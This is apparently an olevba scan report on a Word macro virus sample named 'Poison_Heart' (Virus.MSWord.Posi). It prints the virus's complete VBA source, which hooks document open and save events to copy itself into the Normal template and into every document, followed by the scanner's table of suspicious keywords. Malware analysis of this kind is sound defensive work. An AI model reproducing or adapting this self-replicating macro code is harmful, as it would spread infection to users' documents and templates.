olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Posi
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Posi - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
Word_Poison
End Sub
-------------------------------------------------------------------------------
VBA MACRO Poison_Heart.bas 
in file: ./Virus.MSWord.Posi - OLE stream: 'Macros/VBA/Poison_Heart'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Poison_Heart'
'ver 1.0'

Option Explicit
Dim X As New Poison_Heart_Class
Const temp = "~Temp1.bas"
Const temp1 = "~Temp.bas"
Dim i As Integer


Sub AutoExec()
 Set X.App = Word.Application
End Sub

Sub FileSave()
 DocHookProc
 On Error GoTo hole
 ActiveDocument.Save
hole:
End Sub

Sub FileSaveAs()
 DocHookProc
 Dialogs(wdDialogFileSaveAs).Show
End Sub

Public Sub DocHookProc()
 
Dim Obj As Object
 Dim Bar As CommandBar
 On Error Resume Next
 Application.NormalTemplate.VBProject.VBComponents("Poison_Heart").Export (temp)
 Application.NormalTemplate.VBProject.VBComponents("Poison_Heart_Class").Export (temp1)
 Err = 0
 Set Obj = ActiveDocument.VBProject.VBComponents("Poison_Heart")
 If Err <> 0 Then
  ActiveDocument.VBProject.VBComponents.Import (temp)
 End If
 Err = 0
 Set Obj = ActiveDocument.VBProject.VBComponents("Poison_Heart_Class")
 If Err <> 0 Then
   ActiveDocument.VBProject.VBComponents.Import (temp1)
 End If
 
 Kill temp
 Kill temp1

For i = 1 To ActiveDocument.VBProject.VBComponents(1).CodeModule.CountOfLines
  ActiveDocument.VBProject.VBComponents(1).CodeModule.DeleteLines (1)
Next i
ActiveDocument.VBProject.VBComponents(1).CodeModule.AddFromString ("Private Sub Document_Open()")
ActiveDocument.VBProject.VBComponents(1).CodeModule.InsertLines 2, "Word_Poison"
ActiveDocument.VBProject.VBComponents(1).CodeModule.InsertLines 3, "End Sub"
 

End Sub

Sub Word_Poison()

Dim Obj As Object
 Dim Bar As CommandBar
 On Error Resume Next
 ActiveDocument.VBProject.VBComponents("Poison_Heart").Export (temp)
 ActiveDocument.VBProject.VBComponents("Poison_Heart_Class").Export (temp1)
 Err = 0
 Set Obj = Application.NormalTemplate.VBProject.VBComponents("Poison_Heart")
 If Err <> 0 Then
  Application.NormalTemplate.VBProject.VBComponents.Import (temp)
 End If
 Err = 0
 Set Obj = Application.NormalTemplate.VBProject.VBComponents("Poison_Heart_Class")
 If Err <> 0 Then
  Application.NormalTemplate.VBProject.VBComponents.Import (temp1)
 End If
 
 Kill temp
 Kill temp1

End Sub
-------------------------------------------------------------------------------
VBA MACRO Poison_Heart_Class.cls 
in file: ./Virus.MSWord.Posi - OLE stream: 'Macros/VBA/Poison_Heart_Class'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Poison_Heart'
'ver 1.0'

Public WithEvents App As Word.Application
Private Sub App_DocumentChange()
 DocHookProc
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

